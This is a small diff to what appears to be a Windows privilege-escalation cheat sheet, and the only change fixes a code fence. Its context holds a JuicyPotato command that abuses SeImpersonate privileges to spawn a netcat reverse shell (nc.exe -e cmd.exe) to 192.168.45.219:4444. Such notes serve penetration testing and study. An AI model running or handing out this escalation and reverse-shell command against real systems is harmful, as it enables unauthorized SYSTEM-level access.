@@ -298,7 +298,7 @@ SeImpersonate or SeAssignPrimaryToken privileges Required
 Visit https://ohpe.it/juicy-potato/CLSID/ for a list of CLSIDs to try.
 ```
 JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.219 4444" -t *
-``
+```
 ##### SeRestorePrivilege To System
 SeRestorePrivilege permission required
 
